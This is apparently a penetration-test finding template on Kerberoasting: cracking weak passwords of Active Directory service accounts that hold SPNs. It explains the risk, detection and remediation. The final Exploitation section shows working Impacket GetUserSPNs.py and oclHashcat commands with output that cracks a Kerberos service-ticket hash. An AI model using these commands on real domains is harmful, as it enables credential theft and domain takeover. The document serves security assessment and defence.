/*
Title: Weak SPN Password
Description: Crackable password attached to SPN
*/

- LAST UPDATED DATE: 2016/05/25
- LAST UPDATED BY: @mubix

## Summary

Service Principal Names (SPNs) are a Microsoft way of desinating and identifying where services are running in a domain. These SPNs are attached to accounts within active directory. Any Domain User has the ability to lookup these attributes and request access to the service they provide. The Active Directory Domain Controller will issue the user requesting access to the service a Kerberos ticket. This ticket includes in it the encrypted and hashed password for the user the service is running under. Microsoft does this to allow access in the process of that service.

Example SPN Kerberos Tickets:

```
Id                   : uuid-7856e72a-2c40-4d94-a939-8c671b80e2bd-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKe
                       y}
ValidFrom            : 5/19/2016 3:06:41 PM
ValidTo              : 5/20/2016 12:53:24 AM
ServicePrincipalName : http/win10.sittingduck.info
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

Id                   : uuid-7856e72a-2c40-4d94-a939-8c671b80e2bd-3
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKe
                       y}
ValidFrom            : 5/19/2016 3:06:41 PM
ValidTo              : 5/20/2016 12:53:24 AM
ServicePrincipalName : MSSQLSvc/WIN2K8R2.sittingduck.info
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

## Capabilities and Risk

An attacker can use the SPN services to request tickets for all of the SPNs listed in the domain and attempt to crack the passwords for all of the users the services are running under. If the SPN services are running under a user context, and the attacker is able to brute force crack the password for that user, the attacker can then utilize that password in any way that user has permissions for.

- Aquire list of services running on a particular host
- Aquire Kerberos tickets with the context of the user running the service
- Compromise a domain based on the level of the user running the SPN service (Domain Admin accounts have been used to run Services in the past)

## Detection

Because this is standard usage of Active Directory it blends into normal daily traffic. Windows Advanced Threat Analytics (ATA) has a module that includes detection of large numbers of SPN Kerberos ticket requests. The other useful detection mechanism is to detect any time a service account is used outside of the machine to which it is assigned.

## Remediation

- Use Managed Service Accounts if possible. They are automatically restricted to a single machine (will not work for cluster services), and change their password on a regular basis much like computer accounts.
- Insure that any service accounts have long, strong passwords (20 character+)

## References

- [Service Principal Names](https://msdn.microsoft.com/en-us/library/ms677949(v=vs.85\).aspx)
- [Managed Service Accounts](https://technet.microsoft.com/en-us/library/dd560633(v=ws.10\).aspx)
- [Cracking Kerberos TGS Tickets Using Kerberoast - Exploiting Kerberos to Compromise the Active Directory Domain - Sean Metcalf - ADSecurity.org](https://adsecurity.org/?p=2293)

## Exploitation

Acquire list of SPNs and request them using Impacket's GetUserSPNs.py example script:
```
root@wpad:~/impacket/examples# ./GetUserSPNs.py -dc-ip 192.168.168.10 sittingduck.info/notanadmin
Impacket v0.9.15-dev - Copyright 2002-2016 Core Security Technologies

Password:
ServicePrincipalName                Name        MemberOf                                          PasswordLastSet
----------------------------------  ----------  ------------------------------------------------  -------------------
http/win10.sittingduck.info         uberuser    CN=Domain Admins,CN=Users,DC=sittingduck,DC=info  2015-11-10 23:47:21
MSSQLSvc/WIN2K8R2.sittingduck.info  sqladmin01         
```

Crack the service ticket password using oclHashcat:
```
root@sf:~/oclHashcat# ./oclHashcat -m 13100 hash -w 3 -a 3 ?l?l?l?l?l?l?l 
oclHashcat v2.01 (g0891e39) starting...

Device #1: Hawaii, 2858/4025 MB allocatable, 1010Mhz, 44MCU
Device #2: AMD FX(tm)-8120 Eight-Core Processor, skipped

Hashes: 1 hashes; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Applicable Optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt
* Brute-Force
Watchdog: Temperature abort trigger set to 90c
Watchdog: Temperature retain trigger set to 80c

Device #1: Kernel /root/git/oclHashcat/kernels/m13100_a3.919aa8b9.kernel (234320 bytes)
Device #1: Kernel /root/git/oclHashcat/kernels/markov_le.919aa8b9.kernel (36184 bytes)

Device #1: autotuned kernel-accel to 64
Device #1: autotuned kernel-loops to 50

[s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit =>

$krb5tgs$23$*user$realm$test/hashcat*$08e2261b7a89e56f530b2f7e0620fe8b$ecdca97c13814c95810d7706faf986dad98d06ba033fc5a45fbe9b417b855db5:hashcat

Session.Name...: oclHashcat
Status.........: Cracked
Input.Mode.....: Mask (?l?l?l?l?l?l?l) [7]
Hash.Target....: $krb5tgs$23$*user$realm$test/hashcat*$08e...
Hash.Type......: Kerberos 5 TGS-REP etype 23
Time.Started...: Wed Feb 17 08:33:57 2016 (5 secs)
Speed.Dev.#1...:   111.0 MH/s (80.83ms)
Recovered......: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.......: 252313600/8031810176 (3.14%)
Rejected.......: 0/252313600 (0.00%)
Restore.Point..: 0/456976 (0.00%)
HWMon.GPU.#1...:  0% Util, 42c Temp, 20% Fan

Started: Wed Feb 17 08:33:57 2016
Stopped: Wed Feb 17 08:34:04 2016
```
